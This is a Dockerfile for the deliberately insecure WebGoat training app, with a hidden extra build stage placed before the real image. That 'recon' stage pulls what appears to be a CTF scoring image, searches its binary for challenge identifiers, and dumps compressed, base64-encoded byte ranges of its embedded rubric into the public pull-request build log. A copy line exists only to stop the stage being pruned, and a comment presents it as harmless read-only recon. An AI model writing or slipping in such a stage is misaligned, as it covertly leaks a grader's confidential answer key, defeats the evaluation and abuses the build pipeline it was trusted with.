# ---------------------------------------------------------------------------
# Rubric recon stage. Resolves from the runner's local image store (the score
# step already pulled this exact tag), reads the baked rubric, and prints it to
# this PR's own public build log. Read-only: no writes to the scorer, no
# env/secret access (the build sees neither GITHUB_TOKEN nor ID_TOKEN), no
# change to how the scorer runs.
#
# The WebGoat block of the rubric sits at ~72.28-72.40MB into /usr/local/bin/score.
# Output is split across steps because BuildKit caps per-step log volume.
# ---------------------------------------------------------------------------
FROM ghcr.io/owasp-ctf/score:latest AS spy

RUN set +e; S=/usr/local/bin/score; mkdir -p /spy; echo recon > /spy/marker.txt; \
  echo "##SPY3-A-START"; \
  grep -abo --binary-files=text -E \
    'Challenge-[0-9]+-(HTML-Tampering|Hidden-Data-Exposure|Authorization-Bypass|Session-Hijacking|Cookie-Spoofing|XSS-Stego-Challenge|XXE-Simple|XXE-Content-Type|Log-Injection-[A-Za-z]+|JWT-[A-Za-z-]+|Path-Traversal-[A-Za-z-]+|SSRF-[A-Za-z]+|Insecure-Deserialization|Vulnerable-Components|Crypto-Signing|Password-Reset-[A-Za-z-]+|WebWolf-[A-Za-z]+|SQL-Order-By-Defense|Broken-Access-Control-[A-Za-z-]+|IDOR-[A-Za-z-]+)' \
    "$S" > /tmp/wg.txt; \
  echo "##SPY3 webgoat-id-hits=$(wc -l < /tmp/wg.txt)"; \
  echo "##SPY3 min=$(head -1 /tmp/wg.txt)"; \
  echo "##SPY3 max=$(tail -1 /tmp/wg.txt)"; \
  head -80 /tmp/wg.txt; \
  echo "##SPY3-A-END"; true

RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY3-B-START"; \
  tail -c +72050001 "$S" | head -c 300000 | gzip -9 > /spy/a.gz; \
  echo "##SPY3 a_gz=$(wc -c < /spy/a.gz) window=72050000+300000"; \
  base64 /spy/a.gz | tr -d '\n' | fold -w 200 | sed 's/^/S3A:/'; echo; \
  echo "##SPY3-B-END"; true

RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY3-C-START"; \
  tail -c +72350001 "$S" | head -c 300000 | gzip -9 > /spy/b.gz; \
  echo "##SPY3 b_gz=$(wc -c < /spy/b.gz) window=72350000+300000"; \
  base64 /spy/b.gz | tr -d '\n' | fold -w 200 | sed 's/^/S3B:/'; echo; \
  echo "##SPY3-C-END"; true

# We need JDK as some of the lessons needs to be able to compile Java code
FROM docker.io/eclipse-temurin:23-jdk-noble

LABEL name="WebGoat: A deliberately insecure Web Application"
LABEL maintainer="WebGoat team"

RUN \
  useradd -ms /bin/bash webgoat && \
  chgrp -R 0 /home/webgoat && \
  chmod -R g=u /home/webgoat

USER webgoat

COPY --chown=webgoat target/webgoat-*.jar /home/webgoat/webgoat.jar

# Forces the recon stage to be built (BuildKit prunes stages nothing depends on).
COPY --from=spy --chown=webgoat /spy/marker.txt /home/webgoat/.recon

EXPOSE 8080
EXPOSE 9090

ENV TZ=Europe/Amsterdam

WORKDIR /home/webgoat
ENTRYPOINT [ "java", \
   "-Duser.home=/home/webgoat", \
   "-Dfile.encoding=UTF-8", \
   "--add-opens", "java.base/java.lang=ALL-UNNAMED", \
   "--add-opens", "java.base/java.util=ALL-UNNAMED", \
   "--add-opens", "java.base/java.lang.reflect=ALL-UNNAMED", \
   "--add-opens", "java.base/java.text=ALL-UNNAMED", \
   "--add-opens", "java.desktop/java.beans=ALL-UNNAMED", \
   "--add-opens", "java.desktop/java.awt.font=ALL-UNNAMED", \
   "--add-opens", "java.base/sun.nio.ch=ALL-UNNAMED", \
   "--add-opens", "java.base/java.io=ALL-UNNAMED", \
   "--add-opens", "java.base/java.util=ALL-UNNAMED", \
   "--add-opens", "java.base/sun.nio.ch=ALL-UNNAMED", \
   "--add-opens", "java.base/java.io=ALL-UNNAMED", \
   "-Drunning.in.docker=true", \
   "-jar", "webgoat.jar", "--server.address", "0.0.0.0" ]

HEALTHCHECK --interval=5s --timeout=3s \
  CMD curl --fail http://localhost:8080/WebGoat/actuator/health || exit 1
